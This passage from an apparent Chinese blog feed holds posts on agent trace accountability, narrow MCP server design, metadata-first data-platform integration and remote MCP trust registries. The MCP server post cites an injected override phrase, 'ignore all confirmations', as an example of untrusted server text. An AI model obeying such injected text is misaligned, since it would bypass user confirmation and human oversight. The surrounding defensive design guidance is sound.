        <tag>工具执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Agent Trace 要能回答：这一步到底是谁做的决定</title>
    <url>//2025/03/20/agent-trace-decision-owner/</url>
    <content><![CDATA[<p>Agent Trace 如果只记录“模型调用了 rerun_job”，事故复盘时会留下一个模糊结论：是模型决定重跑，还是工作流规则要求重跑，用户是否确认，权限系统为何允许，后端到底有没有执行成功？这些责任不能压进同一个 tool call span。</p>
<p>我会把建议、授权、编排选择、人工批准和实际操作拆成不同 Decision&#x2F;Operation 事件。每条记录 actor、输入快照、规则或模型版本、证据与结果。这样可以回答“谁在什么依据下推进了哪一步”。</p>
<p class="article-diagram-scroll"><img src="/images/articles/agent-trace-decision-owner.svg" class="lazyload" data-srcset="/images/articles/agent-trace-decision-owner.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent Trace 中的建议、决定与执行责任"></p>
<span id="more"></span>

<h2 id="Proposal-不是-Decision"><a href="#Proposal-不是-Decision" class="headerlink" title="Proposal 不是 Decision"></a>Proposal 不是 Decision</h2><p>模型输出 <code>tool=rerun_job</code> 是 proposal，表示它根据上下文建议调用。Proposal 保存 model snapshot、Prompt Bundle、context artifact hash、候选工具、arguments、理由与 finish state。</p>
<p>Validator 可能因 schema、对象歧义或权限拒绝 proposal；用户也可能不确认。把所有 proposal 都写成“Agent 执行了工具”，会夸大实际动作，并看不到系统挡住了多少错误。</p>
<p>自然语言答案中的建议也要标 actor&#x3D;model。它可以说“建议把并发降到 4”，但如果平台 policy 固定要求并发不超过 8，两者是不同来源。UI 区分模型建议与系统规则，不让用户把模型措辞当正式策略。</p>
<p>Proposal ID 一路关联后续 decision。一次 proposal 经规范化后参数变化，产生新的 canonical proposal&#x2F;version，不能把原始 arguments 悄悄替换。</p>
<h2 id="Policy-Decision-有确定规则负责人"><a href="#Policy-Decision-有确定规则负责人" class="headerlink" title="Policy Decision 有确定规则负责人"></a>Policy Decision 有确定规则负责人</h2><p>Policy engine 输入 subject、action、resource、state 和 context，输出 allow&#x2F;deny&#x2F;obligations、policy version、matched rule IDs 与 decision ID。actor 是 policy service&#x2F;rule owner，不是模型。</p>
<p>“模型选择了它，所以允许”永远不是 policy reason。策略规则由安全&#x2F;业务 owner 发布，有代码评审、版本、有效期和回归。决策能从 rule ID 找到当时内容。</p>
<p>policy timeout&#x2F;unknown 也是结果。高风险动作 fail closed，不能让 orchestrator 自己决定“应该没问题”。如果使用 last-known-good policy，trace 标明快照与陈旧时间。</p>
<p>人工确认是 obligation 的履行，不覆盖权限。用户批准 plan hash 后，policy outcome 从 requires_approval 变为 executable；确认 actor、auth strength、time、expiry 与展示的 plan artifact 都保存。</p>
<h2 id="Orchestrator-负责流程选择"><a href="#Orchestrator-负责流程选择" class="headerlink" title="Orchestrator 负责流程选择"></a>Orchestrator 负责流程选择</h2><p>哪个模型 fallback、是否重试、选择哪个 Workflow 分支、何时停止，是 orchestrator decision。它可能基于固定规则、评分模型或用户配置，都要记录 policy&#x2F;algorithm version 与候选。</p>
<p>例如 provider 429 后路由到备用模型：模型没有决定换供应商，工具也没有。route event 应显示候选因能力&#x2F;地域过滤，最终因健康度和 deadline 选择了谁。</p>
<p>错误恢复同样有 owner。PERMISSION_DENIED 直接停止是规则；OBJECT_AMBIGUOUS 询问用户；RATE_LIMIT 退避。若将错误文本交给模型自由选择，actor 才是模型 proposal，仍需外层验证。</p>
<p>算法决策要保存关键输入，不必把内部完整推理文本存入。route score、threshold、features 和 version 足以复盘。无法解释的黑盒 scorer 至少能离线用同一输入重放。</p>
<h2 id="Tool-Operation-记录真实副作用"><a href="#Tool-Operation-记录真实副作用" class="headerlink" title="Tool Operation 记录真实副作用"></a>Tool Operation 记录真实副作用</h2><p>通过授权后，executor 创建 operation。actor 是具体 service&#x2F;credential，记录 tool version、canonical args hash、idempotency key、target version、下游 request ID 与状态历史。</p>
<p>operation accepted 不等于 succeeded，HTTP timeout 不等于 failed。最终业务验证再产生 verification event，例如新任务实例存在、配置版本已更新。模型最后说“已完成”不能替代这些证据。</p>
<p>人工直接在后台完成动作也要作为 external&#x2F;manual operation 进入同一 Run，actor 是人员。否则 trace 看起来像 Agent 成功，实际是值班同学兜底。</p>
<p>补偿&#x2F;回滚是新 operation，关联原 operation，不修改原结果。谁授权回滚、使用哪个旧版本都有独立记录。</p>
<h2 id="Decision-Ledger-用事件而不是覆盖字段"><a href="#Decision-Ledger-用事件而不是覆盖字段" class="headerlink" title="Decision Ledger 用事件而不是覆盖字段"></a>Decision Ledger 用事件而不是覆盖字段</h2><p>当前状态可以是快照，决策历史必须追加。用户最初拒绝，后来换了计划再批准，两次事件都保留；旧模型 proposal 被 validator 修正，也不能只存最终参数。</p>
<p>事件包含 <code>decision_id</code>、<code>run/step</code>、<code>actor_type/id</code>、<code>decision_type</code>、<code>input_refs</code>、<code>output</code>、<code>rule/model/version</code>、<code>evidence_refs</code>、<code>event_time/observed_at</code>。敏感内容通过 artifact refs 和访问控制，不在公共日志铺开。</p>
<p>W3C&#x2F;OpenTelemetry trace 用 span&#x2F;event 表示技术链路，Decision Ledger 补充业务语义。Span 可以被采样，权限&#x2F;审批&#x2F;副作用决策进入不可丢失审计，两套用 trace&#x2F;run ID 关联。</p>
<p>迟到事件不覆盖已生效决策。资源状态变化后重新授权生成新 decision version，执行器比较 expected version。事故调查能看到当时决策基于旧状态，而不是用今天状态解释昨天行为。</p>
<h2 id="报表按责任层统计"><a href="#报表按责任层统计" class="headerlink" title="报表按责任层统计"></a>报表按责任层统计</h2><p>模型 proposal invalid rate、policy deny、human reject、orchestrator fallback、tool failure、business verification failure 分开。所有失败合成 Agent success rate，团队会围绕模型调 Prompt，而真正问题可能在工具或策略。</p>
<p>人工接管也细分：纠正模型对象、批准高风险计划、修复工具失败、补充缺失知识。接管不是统一负面指标；正常审批本来就是设计，纠正错误才是质量信号。</p>
<p>评测断言 actor boundary：模型不能产生 allow 决策，policy 不能伪造用户确认，orchestrator 不能把 accepted 当 succeeded，finalizer 不能在 verification 缺失时成功。结构性断言比审核最终文字更可靠。</p>
<p>Agent 越自动化，越要避免一句“AI 做了决定”掩盖系统实际责任。模型提出候选，策略授权，人在必要时确认，编排器推进，工具产生效果。Trace 把这些角色和证据拆开，才能用于审计、优化和事故问责。这条责任链如何落到数据平台操作上，见<a href="/2026/08/20/data-platform-agent-verifiable-execution/">数据平台 Agent 可验证执行总纲</a>；同一专题的阅读顺序收在<a href="/topics/data-platform-agent/">数据平台 × AI Agent 专题页</a>。</p>
<h2 id="对照规范与资料"><a href="#对照规范与资料" class="headerlink" title="对照规范与资料"></a>对照规范与资料</h2><ul>
<li><a href="https://opentelemetry.io/docs/specs/otel/trace/api/">OpenTelemetry Trace：Span、Event、Link 与 Status</a></li>
<li><a href="https://www.w3.org/TR/trace-context/">W3C Trace Context：跨服务传播关联身份</a></li>
<li><a href="https://www.nist.gov/itl/ai-risk-management-framework">NIST AI RMF 1.0：AI 风险的 Govern、Map、Measure、Manage</a></li>
<li><a href="https://modelcontextprotocol.io/specification/2024-11-05">MCP 2024-11-05 Specification：Host 的用户同意与控制责任</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Agent Trace</tag>
        <tag>决策审计</tag>
        <tag>责任边界</tag>
      </tags>
  </entry>
  <entry>
    <title>MCP Server 设计先收窄能力面：不要把 Shell、SQL 和 HTTP 直接端出去</title>
    <url>//2025/04/04/mcp-server-narrow-surface/</url>
    <content><![CDATA[<p>MCP Server 很容易从“先把能力接出来”变成一个通用执行面：提供 <code>run_command</code>、<code>query_sql</code>、<code>http_request</code>、<code>read_file(path)</code>，模型似乎什么都能做。开发效率高，安全和可验证性却都变差，因为一个字符串参数就能跨越大量对象和副作用。</p>
<p>我会把 MCP Server 当成业务 Facade，不是内部 API 的透明代理。Resources 用稳定 URI 暴露受控上下文，Tools 表达窄业务动作，Prompts 只是用户可选模板。通用能力留在受限开发环境，不作为企业生产 Server 的默认接口。</p>
<p class="article-diagram-scroll"><img src="/images/articles/mcp-server-narrow-surface.svg" class="lazyload" data-srcset="/images/articles/mcp-server-narrow-surface.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="MCP Server 从窄能力面开始"></p>
<span id="more"></span>

<h2 id="Resources-优先表达可读对象"><a href="#Resources-优先表达可读对象" class="headerlink" title="Resources 优先表达可读对象"></a>Resources 优先表达可读对象</h2><p>表定义、任务配置、运行摘要、工单详情更适合 Resource。URI 例如 <code>catalog://entities/{guid}</code>、<code>jobs://instances/{id}/summary</code>，身份稳定、mime type 明确，可被 Host 决定何时加入上下文。</p>
<p>不要用 <code>file:///</code> 加任意 path 暴露整个文件系统。Server 内部把 URI 映射到授权对象，校验 tenant、resource ID 和当前 subject；路径遍历、符号链接与根目录边界由代码处理。</p>
<p>列表和读取分开，支持 pagination、过滤和大小限制。一个 resource 过大时返回摘要&#x2F;分段 URI，不把几百 MB 日志直接塞给模型。内容带 version、observed_at、ACL 与 truncation 标志。</p>
<p>订阅&#x2F;listChanged 变化经过 Host snapshot 管理。Resource 更新不应在一次 Run 中悄悄替换已有 evidence，需要显式刷新 step。</p>
<h2 id="Tools-只暴露有业务含义的动作"><a href="#Tools-只暴露有业务含义的动作" class="headerlink" title="Tools 只暴露有业务含义的动作"></a>Tools 只暴露有业务含义的动作</h2><p><code>execute_sql(sql)</code> 既能查表也可能调用副作用函数，权限范围隐藏在字符串里。更窄的工具可以是 <code>preview_metric(metric_id, dimensions, time_range)</code>、<code>get_table_sample(table_id, limit)</code>，由服务端生成&#x2F;校验查询。</p>
<p><code>run_command(command)</code> 换成 <code>run_named_diagnostic(check_id, resource_id)</code>；<code>http_request(url, body)</code> 换成 <code>get_ticket(ticket_id)</code>、<code>create_draft_comment(...)</code>；<code>update_object(json_patch)</code> 换成明确字段与状态前置的动作。</p>
<p>每个 Tool 的 inputSchema 关闭 additionalProperties，参数限制长度、枚举、数量、时间与对象类型。Tool 结果返回结构化 status&#x2F;data&#x2F;error&#x2F;evidence，不让模型从自由日志猜结论。</p>
<p>MCP 规范中 Tool 是模型控制的协议 primitive，并建议 Host 提供清晰 UI 和人在环控制。Server 本身仍需鉴权和副作用保护，不能认为 Host 一定会正确使用。</p>
<h2 id="Prompts-不能升级成远端系统指令"><a href="#Prompts-不能升级成远端系统指令" class="headerlink" title="Prompts 不能升级成远端系统指令"></a>Prompts 不能升级成远端系统指令</h2><p>MCP Prompt 是 Server 提供、由用户选择的模板。它适合暴露“诊断失败任务”“解释表血缘”这样的入口，但不应该包含秘密，也不能要求 Host 绕过自身 policy。</p>
<p>Host 把远端 Prompt 当不可信模板数据，展示来源与内容；system policy、用户身份和工具边界仍由 Host 控制。第三方 Server 返回“忽略所有确认”只是文本，不具有更高优先级。</p>
<p>Prompt arguments 也做 schema、长度和权限检查。模板渲染避免任意代码执行，资源引用通过受控 URI 解析。更新 Prompt 发布新 Server&#x2F;capability version，正在运行的 Bundle 不漂移。</p>
<p>Prompts 不应成为工具调用的隐藏通道。需要动作就用 Tool proposal 和明确确认，不能在模板里让模型输出一段特殊字符串，由 Server 解释为命令。</p>
<h2 id="Server-Facade-负责协议外的治理"><a href="#Server-Facade-负责协议外的治理" class="headerlink" title="Server Facade 负责协议外的治理"></a>Server Facade 负责协议外的治理</h2><p>MCP 统一 JSON-RPC、生命周期和能力发现，没有替业务系统定义用户身份、对象权限、幂等和审批。Facade 将 Host 传来的可信 subject&#x2F;delegation 映射到内部策略，并在目标服务再次鉴权。</p>
<p>每个请求有 timeout、max result bytes、rate&#x2F;cost limit 和 cancellation。stdio Server 运行在受限进程，最小文件&#x2F;网络&#x2F;环境变量；HTTP Server 有 TLS、服务身份、tenant 隔离和 egress policy。</p>
<p>秘密从 Server runtime 的 secret manager 获取，不出现在 tool schema、日志和结果。不同上游系统使用不同 credential profile，撤销一个不会影响全部能力。</p>
<p>Facade 记录 MCP request ID、run&#x2F;tool call、server&#x2F;tool version、subject、policy decision、下游 operation 和 raw&#x2F;normalized result。错误只暴露稳定 code，内部堆栈通过 evidence ref 受控查看。</p>
<h2 id="粒度过细与过宽都要测"><a href="#粒度过细与过宽都要测" class="headerlink" title="粒度过细与过宽都要测"></a>粒度过细与过宽都要测</h2><p>工具太宽风险大，太细会让模型为简单目标连续调用几十次，增加成本和失败点。粒度围绕可独立授权、可验证、可幂等的业务动作，而不是每个数据库方法一个 Tool。</p>
<p>观察真实 traces：模型经常按固定顺序调用三四个只读工具，可以组合成一个查询型 tool&#x2F;resource view；经常因参数歧义失败，拆出 resolve&#x2F;preview；一个工具包含多个风险不同分支，则继续拆窄。</p>
<p>组合工具仍保留内部步骤证据。<code>diagnose_job</code> 可以收集状态、日志摘要和资源指标，但不能顺便自动重跑。诊断与修复的权限、确认和副作用不同。</p>
<p>评测包括 tool selection、参数、对象歧义、权限、timeout、结果大小和 Prompt Injection。单纯 <code>tools/list</code>&#x2F;<code>tools/call</code> 成功不代表设计适合模型。</p>
<h2 id="Server-发布需要清单与契约测试"><a href="#Server-发布需要清单与契约测试" class="headerlink" title="Server 发布需要清单与契约测试"></a>Server 发布需要清单与契约测试</h2><p>Server registry 保存来源、owner、binary&#x2F;image hash、protocol versions、capabilities、tools&#x2F;resources&#x2F;prompts hashes、权限和数据分类。未知 Server 默认不连接，更新先扫描与测试。</p>
<p>契约测试覆盖 initialize&#x2F;version mismatch、分页、listChanged、malformed input&#x2F;result、取消、慢响应、Server crash、重复 request 与未知 content type。Tool 的业务 sandbox 还测试幂等、状态冲突和结果回读。</p>
<p>紧急禁用能按 Server、Tool 或资源域生效。Host 即便收到旧 list，也在调用前查 current deny policy。弃用先检查哪些 Bundles&#x2F;未完成 Runs 仍引用。</p>
<p>MCP 降低了连接成本，也让一个能力更容易进入多个 Agent。正因为复用范围扩大，Server 接口更需要窄、稳定、可授权。把通用命令包装成标准协议不会自动变安全，业务 Facade 才是生产边界。它在完整系统里的位置，可以回到<a href="/2026/08/20/data-platform-agent-verifiable-execution/">数据平台 Agent 可验证执行总纲</a>继续看；授权以后由谁推进操作，则要靠 <a href="/2025/03/20/agent-trace-decision-owner/">Agent Trace 的责任分层</a>说明白。</p>
<h2 id="对照官方规范"><a href="#对照官方规范" class="headerlink" title="对照官方规范"></a>对照官方规范</h2><ul>
<li><a href="https://modelcontextprotocol.io/specification/2024-11-05">MCP 2024-11-05 Specification：Host、Client、Server 与安全原则</a></li>
<li><a href="https://modelcontextprotocol.io/specification/2024-11-05/server/index">MCP 2024-11-05 Server Overview：Prompts、Resources、Tools 的控制模型</a></li>
<li><a href="https://modelcontextprotocol.io/specification/2024-11-05/server/tools">MCP 2024-11-05 Tools：发现、调用、结果与用户交互</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP SSRF Prevention Cheat Sheet：任意 URL 与网络访问风险</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Agent 安全</tag>
        <tag>MCP Server</tag>
        <tag>工具设计</tag>
      </tags>
  </entry>
  <entry>
    <title>数据平台接 MCP，我会先开放元数据查询，而不是任务重跑</title>
    <url>//2025/04/06/data-platform-mcp-metadata-first/</url>
    <content><![CDATA[<p>数据平台接 MCP 时，最吸引人的 Demo 是让 Agent 直接“重跑这个任务”或“补最近七天数据”。但执行链涉及对象歧义、生产权限、依赖、资源和覆盖风险，任何一层不成熟都会把模型错误变成真实操作。</p>
<p>我更愿意从元数据查询开始：找表、看字段、解释 owner、查函数、展开一两层血缘。它是低副作用场景，同时能逼出 MCP Server 最关键的基础能力：稳定对象身份、权限过滤、版本、新鲜度、分页和证据返回。</p>
<p class="article-diagram-scroll"><img src="/images/articles/data-platform-mcp-metadata-first.svg" class="lazyload" data-srcset="/images/articles/data-platform-mcp-metadata-first.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="数据平台 MCP 的低风险起步路径"></p>
<span id="more"></span>

<h2 id="第一批能力围绕“找对对象”"><a href="#第一批能力围绕“找对对象”" class="headerlink" title="第一批能力围绕“找对对象”"></a>第一批能力围绕“找对对象”</h2><p><code>search_entities(query, type, environment, limit, cursor)</code> 负责模糊入口，返回权限过滤后的候选；<code>get_entity(guid, fields)</code> 返回确定实体；不要做一个 <code>ask_catalog(question)</code> 把搜索和答案都藏在 Server 内。</p>
<p>候选带 GUID、typeName、qualifiedName、display name、environment、owner、status、metadata version 和 match reason。同名表必须展示 cluster&#x2F;database，模型不能只拿名字最高相似度。</p>
<p>Apache Atlas 的 Hive Hook 使用 <code>db.table@cluster</code> 作为 table qualifiedName，并用唯一属性去重。MCP Resource URI 可以直接围绕 GUID 设计，例如 <code>catalog://entities/{guid}</code>，展示名变化不影响引用。</p>
<p>搜索无结果返回 coverage&#x2F;filters summary，不泄露无权对象。对象不存在与无权按策略统一错误，内部用 decision ID 区分。</p>
<h2 id="Resource-用于事实，Tool-用于查询关系"><a href="#Resource-用于事实，Tool-用于查询关系" class="headerlink" title="Resource 用于事实，Tool 用于查询关系"></a>Resource 用于事实，Tool 用于查询关系</h2><p>实体当前结构适合作 Resource：表列、描述、owner、分类、术语、source version、observed_at。Host 决定何时读取和放入模型上下文，答案引用稳定 URI&#x2F;version。</p>
<p>血缘、搜索和带条件枚举需要 Tool，因为有方向、深度、类型和 limit 参数。<code>get_lineage(guid, direction, depth&lt;=2, include_columns=false)</code> 比返回整个图安全、可控。</p>
<p>函数&#x2F;UDF 可以按 Resource 暴露签名、参数、返回类型、示例和 engine version；搜索函数用 Tool。SQL Copilot 先 resolve 函数，再生成，避免模型凭名字猜方言。</p>
<p>MCP Prompts 可提供“查表并解释血缘”的用户入口，但 Prompt 不替代 system policy。模板引用 Resource&#x2F;Tool 的方式可见、版本固定，不让远端模板扩展权限。</p>
<h2 id="每个结果都要带证据边界"><a href="#每个结果都要带证据边界" class="headerlink" title="每个结果都要带证据边界"></a>每个结果都要带证据边界</h2><p>实体字段返回 source、collector、metadata version、observed_at 和 freshness。owner 缺失就返回 null + missing，不让 Server 或模型猜；多个来源冲突，返回 conflict candidates 与 authority。</p>
<p>血缘边带 process&#x2F;query&#x2F;run、collector、direction 和 confidence。静态 SQL 推断与运行 Hook 证据区分。路径中断时显示 gap，不把 A→B、B?C 自动说成 A 的确定下游是 C。</p>
<p>结果大小有限，分页 cursor 不让模型改写。超过深度提示缩小范围或提交异步查询。大 schema 可返回 columns resource 列表，而不是一个 Tool result 塞几千列。</p>
<p>答案 trace 记录使用的 MCP Server&#x2F;protocol、tool&#x2F;resource version 与 entity IDs。用户能从自然语言结论点回 Catalog 复核。</p>
<h2 id="权限与新鲜度在只读阶段就验证"><a href="#权限与新鲜度在只读阶段就验证" class="headerlink" title="权限与新鲜度在只读阶段就验证"></a>权限与新鲜度在只读阶段就验证</h2><p>只读不等于公开。表存在性、字段名、owner 和血缘都可能敏感。MCP Host 携带可信 subject context，Server&#x2F;底层 Catalog 两层鉴权；模型参数不能传 <code>user_id</code> 覆盖主体。</p>
<p>权限变更先失效 resource&#x2F;query cache。缓存 key 包含 subject scope 和 policy version，不把管理员血缘复用给普通用户。Resource 引用点击时回源再次鉴权。</p>
<p>元数据采集会延迟。回答“当前 owner”时附 last observed；超过 domain freshness SLO，标 stale 或回源。MCP listChanged&#x2F;subscribe 可以传更新信号，Host 仍需管理 index&#x2F;cache 版本。</p>
<p>安全测试覆盖跨租户 GUID、猜测 qualifiedName、分页遍历、列级权限、血缘跨域、过期会话和 Server 直接绕过 Gateway。</p>
<h2 id="先用真实问题评估-Server-设计"><a href="#先用真实问题评估-Server-设计" class="headerlink" title="先用真实问题评估 Server 设计"></a>先用真实问题评估 Server 设计</h2><p>评测集来自 Catalog 搜索日志、数据开发工单和运维问题：同名表、中文业务别名、测试&#x2F;生产、历史下线、缺 owner、断血缘、函数版本。标注目标 GUID、允许关系和权限主体。</p>
<p>指标先看 entity top-k、歧义识别、evidence completeness、权限违规、latency 与 tool calls。自然语言好不好看放在后面。对象找错时，后续 SQL&#x2F;重跑越自动越危险。</p>
<p>Trace 观察工具粒度。若每次找一张表都要六次调用，可能缺组合只读查询；若一个调用返回全 Catalog，接口过宽。根据真实任务调整，不凭 schema 数量评价 MCP Server。</p>
<p>Connector&#x2F;Server 故障也要可恢复：initialize、search、read、lineage 各自 timeout&#x2F;error，Host 不把旧结果冒充当前；unknown result type 保留原生证据并失败。</p>
<h2 id="执行能力按风险逐级开放"><a href="#执行能力按风险逐级开放" class="headerlink" title="执行能力按风险逐级开放"></a>执行能力按风险逐级开放</h2><p>metadata 链路稳定后，下一步是 SQL plan&#x2F;preview：生成候选、真实 parser&#x2F;catalog&#x2F;EXPLAIN，不直接运行。再开放只读查询代理，设置资源与结果限制。</p>
<p>任务运维先 read instance&#x2F;log&#x2F;status，再 dry-run rerun plan，最后才是绑定审批和 idempotency 的 execute。每升一级都新增 policy、operation state、回读验证与回归集。</p>
<p>同一个 MCP Server 不必同时承担 Catalog 与生产执行。按安全域拆 Server&#x2F;credential，Host 可在分析 Run 只连接 metadata Server。即使执行 Server 出问题，读取面不需要跟着扩大权限。</p>
<p>数据平台 MCP 的第一价值，是把已有元数据和工具用标准方式交给 Agent；第一风险，是把平台内部广泛能力过早端出去。metadata-first 能用低副作用问题验证身份、协议和证据链，也为后续 SQL 与运维动作提供准确对象基础。</p>
<h2 id="对照源码与官方规范"><a href="#对照源码与官方规范" class="headerlink" title="对照源码与官方规范"></a>对照源码与官方规范</h2><ul>
<li><a href="https://modelcontextprotocol.io/specification/2024-11-05">MCP 2024-11-05 Specification：Resources、Prompts、Tools 与 Host 责任</a></li>
<li><a href="https://modelcontextprotocol.io/specification/2024-11-05/server/index">MCP 2024-11-05 Server Overview：三类 Server primitives</a></li>
<li><a href="https://github.com/apache/atlas/blob/1a4735939f3ec3ed225f1d12e40653b8eaf610b3/docs/src/documents/Hook/HookHive.md#L18-L56">Apache Atlas 2.2.0 Hive Hook：实体属性与 qualifiedName</a></li>
<li><a href="https://github.com/apache/atlas/blob/1a4735939f3ec3ed225f1d12e40653b8eaf610b3/intg/src/main/java/org/apache/atlas/model/discovery/SearchParameters.java#L41-L127">Apache Atlas 2.2.0 <code>SearchParameters</code>：类型、术语、分类与过滤</a></li>
</ul>
]]></content>
      <categories>
        <category>数据平台与 Agent</category>
      </categories>
      <tags>
        <tag>元数据</tag>
        <tag>数据 Catalog</tag>
        <tag>MCP</tag>
      </tags>
  </entry>
  <entry>
    <title>Remote MCP 接入要有信任清单：一个 URL 不能直接变成工具能力</title>
    <url>//2025/05/22/remote-mcp-trust-registry/</url>
    <content><![CDATA[<p>OpenAI 昨天宣布 Responses API 支持 remote MCP servers。对 Agent 平台来说，这会显著降低远端工具接入门槛，也带来一个直接问题：用户或模型提供的 MCP URL，能不能马上连接并把工具放进上下文？我的答案是否定的。</p>
<p>MCP 协议兼容只证明双方能交换消息，不证明 Server 的身份、代码、权限和数据处理值得信任。我会用 Trust Registry 把“发现一个 URL”与“允许某类用户在某类 Run 中连接”分开。</p>
<p class="article-diagram-scroll"><img src="/images/articles/remote-mcp-trust-registry.svg" class="lazyload" data-srcset="/images/articles/remote-mcp-trust-registry.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Remote MCP 连接前的信任解析"></p>
<span id="more"></span>

<h2 id="Registry-保存的是信任声明"><a href="#Registry-保存的是信任声明" class="headerlink" title="Registry 保存的是信任声明"></a>Registry 保存的是信任声明</h2><p>每个 Remote Server 使用稳定 registry ID，不让生产请求直接传任意 URL。注册项包含 owner、publisher、approved domains&#x2F;IP policy、transport、auth type、allowed scopes、protocol versions、capability hashes、data classifications、regions、risk 和 review expiry。</p>
<p>URL 可以变化，身份不能只靠 URL。支持时验证 TLS certificate、服务身份或签名 metadata；至少把域名、证书&#x2F;public key pin 策略与企业审批关联。Server 迁移域名是一次变更，不自动跟随重定向。</p>
<p>注册来源分内部自建、审核第三方和用户自托管。三类信任等级决定可访问的数据、可暴露工具和是否允许生产动作。Marketplace 热度、GitHub stars 或能通过 initialize 都不能替代企业审核。</p>
<p>registry entry 有版本与有效期。Server owner、隐私政策、scope 或工具列表变化，触发重新评审。过期后可只读隔离或停止新连接，不让一次审批永久有效。</p>
<h2 id="连接时重新验证网络与协议"><a href="#连接时重新验证网络与协议" class="headerlink" title="连接时重新验证网络与协议"></a>连接时重新验证网络与协议</h2><p>请求只提交 registry ID，gateway 解析当前批准 endpoint。DNS 解析前后、重定向目标和最终 IP 都检查，阻止 SSRF 到内网、loopback 和 cloud metadata。egress firewall 再做网络层兜底。</p>
<p>TLS 验证、hostname、certificate policy、HTTP status&#x2F;content type 与 response size 都有上限。OAuth&#x2F;token 由 gateway 的 secret manager 管理，不进入模型、Prompt 或 Server URL。</p>
<p>MCP initialize 协商 protocol version 与 capabilities。返回不支持版本、声明之外 capability 或未知 experimental feature 时，连接失败或按 allowlist 关闭。initialize 成功也只是协议通过，下一步仍按 registry policy 过滤 tools&#x2F;resources&#x2F;prompts。</p>
<p>会话保存 server identity、endpoint resolution、protocol&#x2F;capability&#x2F;tool-list hashes。Server 重连后重新校验，不沿用旧 snapshot；一次 Agent Run 则固定已批准 snapshot，避免中途工具漂移。</p>
<h2 id="工具列表必须二次收窄"><a href="#工具列表必须二次收窄" class="headerlink" title="工具列表必须二次收窄"></a>工具列表必须二次收窄</h2><p>Server 列出的全部 Tools 不是模型可见列表。Host 按 tenant、user、workflow step、risk 与 registry allowlist 求交，只暴露当前需要的工具。新增 listChanged tool 先进入 quarantine&#x2F;contract tests，新 Run 才能使用。</p>
<p>输入 schema 做静态检查：禁止过宽 additionalProperties、无上限字符串&#x2F;数组、任意 URL&#x2F;path&#x2F;command 等高风险形态。description 扫描秘密和误导性权限声明，但文本扫描不作为唯一安全措施。</p>
<p>工具元数据补齐企业字段：action&#x2F;resource type、permissions、side effect、idempotency、confirmation、timeout、output&#x2F;error schema。MCP Server 没提供的内容由 registry overlay 定义，并与 tool hash 绑定。</p>
<p>Remote MCP Tools 在供应商 Responses API 内被模型选择时，企业网关仍要知道实际 call、用户同意和结果。provider-managed invocation 不应绕过 Host 的工具策略与审计；不支持所需控制的场景就不开放该 Server。</p>
<h2 id="数据出域要逐调用判断"><a href="#数据出域要逐调用判断" class="headerlink" title="数据出域要逐调用判断"></a>数据出域要逐调用判断</h2><p>连接 Server 本身不代表允许发送所有对话。每次 resource read&#x2F;tool call 检查将发送的字段、数据分类、目的、region 和 user consent。上一步从内部系统读取的 PII，不能因下一步工具是“搜索”就自动发送给第三方。</p>
<p>参数做 data label propagation。敏感 artifact 只传引用或脱敏摘要；Server 需要原文时，策略明确要求更高审批。响应也标来源与 trust level，不因通过 MCP 返回就变成可信 system instruction。</p>
<p>Server 返回 resource URI、embedded content 或外部链接时，不自动递归抓取。URI scheme&#x2F;domain&#x2F;size 经 allowlist，引用进入模型前保留 provenance。Prompt Injection 与恶意文件仍按不可信内容处理。</p>
<p>日志按字段脱敏。access token、Authorization、signed URL 和敏感 payload 不写普通 trace；审计保存 registry&#x2F;tool、subject、data-class summary、policy decision 和下游 request ID。</p>
<h2 id="撤销要比发布更快"><a href="#撤销要比发布更快" class="headerlink" title="撤销要比发布更快"></a>撤销要比发布更快</h2><p>发现 Server 被攻陷、域名接管、工具 schema 突变或数据处理违规时，registry 支持按 server、endpoint、certificate、tool 和 tenant 立即 deny。Gateway 每次调用检查 current revocation，不只在会话初始化时检查。</p>
<p>运行中的 operation 根据风险取消、冻结或继续对账。模型看到工具突然不可用时，返回明确 <code>SERVER_REVOKED</code>，不能自动寻找一个未经批准的替代 URL。</p>
<p>凭据轮换&#x2F;撤销与 registry 联动，缓存和长连接清理。已获取的资源进入影响分析：哪些 Runs、answers、memories 和缓存引用该 Server，按 retention&#x2F;security policy 隔离或重建。</p>
<p>恢复需新 registry version、重新契约&#x2F;安全测试和灰度。不能只改回 allow&#x3D;true，原 incident 的 Server binary、证书和 capability hashes 都要对上。</p>
<h2 id="用探针和调用图持续验证"><a href="#用探针和调用图持续验证" class="headerlink" title="用探针和调用图持续验证"></a>用探针和调用图持续验证</h2><p>定期从批准网络执行 initialize、tools&#x2F;list&#x2F;resource read 的无敏感探针，检查身份、版本、schema、latency 和错误。探针成功不代表业务正确，但能发现域名、证书和协议漂移。</p>
<p>调用图统计哪些 users&#x2F;Agents 调哪个 Server&#x2F;tool、发送哪些数据分类、成功&#x2F;拒绝&#x2F;错误与成本。一个几乎没人用却拥有广泛 scopes 的 Server，应缩权或下线。</p>
<p>供应链变更进入监控：registry 配置、Server release、依赖漏洞与 publisher 变更。自托管 Server 固定 image digest，远端 SaaS 至少固定协议&#x2F;tool contract 并设变化告警。</p>
<p>Remote MCP 让连接变简单，信任并不会随协议自动获得。用 registry 把 Server 身份、能力、数据边界和撤销机制做成显式资产，才能让生态扩张不等于攻击面无边界扩张。</p>
<h2 id="对照官方资料与规范"><a href="#对照官方资料与规范" class="headerlink" title="对照官方资料与规范"></a>对照官方资料与规范</h2><ul>
<li><a href="https://openai.com/index/new-tools-and-features-in-the-responses-api/">OpenAI 2025-05-21：Responses API 支持 Remote MCP Servers</a></li>
<li><a href="https://modelcontextprotocol.io/specification/2024-11-05">MCP Specification：Host、Server、用户控制与工具安全</a></li>
